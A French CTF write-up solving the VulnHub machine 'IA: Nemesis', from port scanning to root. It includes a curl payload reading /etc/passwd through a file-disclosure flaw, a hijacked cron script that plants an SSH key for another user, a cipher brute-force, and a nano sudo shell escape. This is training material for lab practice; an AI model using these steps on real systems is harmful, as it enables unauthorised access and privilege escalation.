---
title: "Solution du CTF IA: Nemesis de VulnHub"
tags: [CTF, VulnHub]
---

[IA: Nemesis](https://vulnhub.com/entry/ia-nemesis-101,582/) est un CTF proposé par [Infosec Articles](https://www.infosecarticles.com/). Il est présenté comme étant de difficulté moyenne à difficile, mais vraisemblablement puis moyenne (il requiert toutefois des connaissances en programmation).

## Fausse root

On trouve deux serveurs web et un SSH, les trois sur des ports custom :

```
Nmap scan report for 192.168.56.175
Host is up (0.00020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-enum: 
|   /login.html: Possible admin folder
|   /robots.txt: Robots file
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_  /script/: Potentially interesting directory w/ listing on 'apache/2.4.38 (debian)'
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.175
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.56.175:80/registration.html
|     Form id: basic-addon1
|_    Form action: 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-9517   7.8     https://vulners.com/cve/CVE-2019-9517
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|--- snip ---
52845/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /robots.txt: Robots file
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
52846/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:7.9p1: 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19    *EXPLOIT*
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    *EXPLOIT*
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT*
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT*
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT*
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT*
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2019-16905  4.4     https://vulners.com/cve/CVE-2019-16905
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685
|_      PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT*
```

Le ssh ne semble permettre que la connexion via clé.

Dans le premier port web je trouve des identifiants :

```html
		 <h1 class="banner_heading">A Note From Admin</h1>
                    <pre class="banner_txt">We are planning to shift our website to a new domain with new and attractive
                theme ,but currently our clients are facing some issues in web applicaton
                so as a part of security team you have to find the bug and fix them!!

                    </pre>

                </div>
            </div>

            <div class="item">
                <div class="fill" style="background-image:url('img/banner-slide-3.jpg');"></div>
                <div class="carousel-caption slide-up">
                    <pre class="banner_txt">
				Login Details => username : hacker_in_the_town password : thanos
			</pre>
                </div>
            </div>
```

On peut les utiliser sur la page de login, mais tout est côté client donc pas d'intérêt :

```js
function validate() {
               window.location = "thanoscarlos.html";
            } 

function validateForm() {
  var x = document.forms["myForm"]["uname"].value;
  var y = document.forms["myForm"]["pass"].value; 
  if (x == "") {
    alert("Name must be filled out");
    return false;
  }
 if (y == "") {
    alert("Password must be filled out");
    return false; 
}
 if (x == "hacker_in_the_town" && y == "thanos")
	{
		document.write("You will be redirected to main page in 3 sec.");
            	setTimeout('validate()', 3000);
	}
}
```

## Everything went better than expected

Finalement j'ai lancé `Wapiti` sur le second port :

```bash
wapiti -u http://192.168.56.175:52845/ -v2 --color
```

Une faille de directory traversal a immédiatement été trouvée :

```
---
Linux local file disclosure vulnerability in http://192.168.56.175:52845/ via injection in the parameter message
Evil request:
    POST / HTTP/1.1
    host: 192.168.56.175:52845
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.56.175:52845/
    content-length: 31
    Content-Type: application/x-www-form-urlencoded

    submit=&message=%2Fetc%2Fpasswd
---
```

Le rapport généré par `Wapiti` donne le PoC suivant :

```bash
curl "http://192.168.56.175:52845/" -e "http://192.168.56.175:52845/" -d "submit=&message=%2Fetc%2Fpasswd"
```

Je remarque ainsi la présence d'un utilisateur `Thanos` :

```
thanos:x:1001:1001:Thanos,,,:/home/thanos:/bin/bash
```

J'ai tenté de lire sa clé privée SSH avec la faille web et ça a fonctionné. Une fois connecté je remarque un script Python dont le propriétaire est `carlos` :

```console
thanos@nemesis:~$ id
uid=1001(thanos) gid=1001(thanos) groups=1001(thanos)
thanos@nemesis:~$ ls -al
total 40
drwxr-xr-x 4 thanos thanos 4096 Oct 25  2020 .
drwxr-xr-x 4 root   root   4096 Oct  6  2020 ..
-rw-r--r-- 1 carlos carlos  345 Oct  3  2020 backup.py
-rw------- 1 thanos thanos   72 Oct 25  2020 .bash_history
-rw-r--r-- 1 thanos thanos  220 Oct  6  2020 .bash_logout
-rw-r--r-- 1 thanos thanos 3526 Oct  6  2020 .bashrc
-rw-r--r-- 1 thanos thanos  800 Oct  6  2020 flag1.txt
drwxr-xr-x 3 thanos thanos 4096 Oct  7  2020 .local
-rw-r--r-- 1 thanos thanos  807 Oct  6  2020 .profile
drwxr-xr-x 2 thanos thanos 4096 Oct  7  2020 .ssh
thanos@nemesis:~$ cat flag1.txt 

                          _.-'|
                      _.-'    |
                  _.-'        |
               .-'____________|______
               |                     |
               | Congratulations for |
               |  pwning user Thanos |
               |                     |
               |      _______        |
               |     |.-----.|       |
               |     ||x . x||       |
               |     ||_.-._||       |
               |     `--)-(--`       |
               |    __[=== o]___     |
               |   |:::::::::::|\    |
               |   `-=========-`()   |
               |                     |
               |  Flag{LF1_is_R34L}  |
               |                     |
               |    -= Nemesis =-    |
```

L'utilisateur a l'UID 100 :

```
carlos:x:1000:1000:Carlos,,,:/home/carlos:/bin/bash
```

Et via `pspy` je remarque que toutes les minutes il exécute ce script :

```
2023/04/12 20:58:01 CMD: UID=0    PID=942    | /usr/sbin/CRON -f 
2023/04/12 20:58:01 CMD: UID=1000 PID=943    | /bin/sh -c /usr/bin/python /home/thanos/backup.py
```

Je n'ai pas les droits sur les fichiers mais, étant propriétaire du dossier parent, je peux le déplacer / renommer :

```console
thanos@nemesis:~$ ls -al backup.py 
-rw-r--r-- 1 carlos carlos 345 Oct  3  2020 backup.py
thanos@nemesis:~$ ls -ald .
drwxr-xr-x 4 thanos thanos 4.0K Apr 12 21:04 .
thanos@nemesis:~$ mv backup.py backup_de_backup.py
```

Je crée alors un autre script à la place :

```python
import os
os.system("mkdir -p /home/carlos/.ssh")
os.system("echo ssh-rsa AAAAB--- snip ---qPflmWnV7Ez8/h > /home/carlos/.ssh/authorized_keys")
```

## Brute vs Python

Une fois connecté en tant que `carlos` il est vite question d'un script Python de chiffrement :

```console
carlos@nemesis:~$ ls
encrypt.py  flag2.txt  root.txt
carlos@nemesis:~$ cat flag2.txt 

                          _.-'|
                      _.-'    |
                  _.-'        |
               .-'____________|______
               |                     |
               | Congratulations for |
               |  pwning user Carlos |
               |                     |
               |      _______        |
               |     |.-----.|       |
               |     ||x . x||       |
               |     ||_.-._||       |
               |     `--)-(--`       |
               |    __[=== o]___     |
               |   |:::::::::::|\    |
               |   `-=========-`()   |
               |                     |
               | Flag{PYTHON_is_FUN} |
               |                     |
               |    -= Nemesis =-    |
               `---------------------`

carlos@nemesis:~$ cat root.txt 
The password for user Carlos has been encrypted using some algorithm and the code used to encrpyt the password is stored in "encrypt.py". You need to find your way to hack the encryption algorithm and get the password. The password format is "************FUN********"
Good Luck!
```

Le script est le suivant :

```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
    gcd = b
    return gcd, x, y

def modinv(a, m):
    gcd, x, y = egcd(a, m)
    if gcd != 1:
        return None
    else:
        return x % m

def affine_encrypt(text, key):
    return ''.join([ chr((( key[0]*(ord(t) - ord('A')) + key[1] ) % 26)
                  + ord('A')) for t in text.upper().replace(' ', '') ])

def affine_decrypt(cipher, key):
    return ''.join([ chr((( modinv(key[0], 26)*(ord(c) - ord('A') - key[1]))
                    % 26) + ord('A')) for c in cipher ])

def main():
    text = 'REDACTED'
    affine_encrypted_text="FAJSRWOXLAXDQZAWNDDVLSU"
    key = [REDACTED,REDACTED]
    print('Decrypted Text: {}'.format
    ( affine_decrypt(affine_encrypted_text, key) ))

if __name__ == '__main__':
    main()
```

On voit que la fonction `egcd` fait des opérations mathématiques. Elle s'attend donc à recevoir des chiffres en paramètres.

Elle est appelée depuis `modinv` qui par conséquent prend aussi des chiffres en paramètres.

On en déduit que le paramètre `key` de `affine_decrypt` doit être un tuple de deux chiffres.

J'ai donc modifié `main` pour bruteforcer les deux valeurs et sortir quand on obtient un texte clair contenant `FUN` :

```python
def main():
    affine_encrypted_text="FAJSRWOXLAXDQZAWNDDVLSU"
    for i in range(10000):
        for j in range(10000):
            try:
                result = affine_decrypt(affine_encrypted_text, [i, j])
            except TypeError:
                continue
            if "FUN" in result:
                print(result, i, j)
                exit()
```

Ça tombe très vite :

```console
carlos@nemesis:~$ time python encrypt.py 
('ENCRYPTIONISFUNPASSWORD', 11, 13)

real    0m1.955s
user    0m1.933s
sys     0m0.019s
```

Avec le mot de passe, on peut cette fois lister les autorisations `sudo` :

```console
carlos@nemesis:~$ sudo -l
[sudo] password for carlos: 
Matching Defaults entries for carlos on nemesis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User carlos may run the following commands on nemesis:
    (root) /bin/nano /opt/priv
```

Il existe un GTFObin pour `Nano` consistant à faire un remplacement de chaine et spécifier un programme externe (combinaison de touches `Ctrl+R, Ctrl+X`) :

```console
Command to execute: reset;sh 1>&0 2>&0
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt

             ,----------------,              ,---------,
        ,-----------------------,          ,"        ,"|
      ,"                      ,"|        ,"        ,"  |
     +-----------------------+  |      ,"        ,"    |
     |  .-----------------.  |  |     +---------+      |
     |  |                 |  |  |     | -==----'|      |
     |  |  I LOVE Linux!  |  |  |     |         |      |
     |  |                 |  |  |/----|`---=    |      |
     |  | root@nemesis:~# |  |  |   ,/|==== ooo |      ;
     |  |                 |  |  |  // |(((( [33]|    ,"
     |  `-----------------'  |," .;'| |((((     |  ,"
     +-----------------------+  ;;  | |         |,"    
        /_)______________(_/  //'   | +---------+
   ___________________________/___  `,
  /  oooooooooooooooo  .o.  oooo /,   \,"-----------
 / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
/_==__==========__==_ooo__ooo=_/'   /___________,"
`-----------------------------'

FLAG{CTFs_ARE_AW3S0M3}

Congratulations for getting root on Nemesis! We hope you enjoyed this CTF!

Share this Flag on Twitter (@infosecarticles). Cheers!

Follow our blog at https://www.infosecarticles.com

Made by CyberBot and 0xMadhav!
```


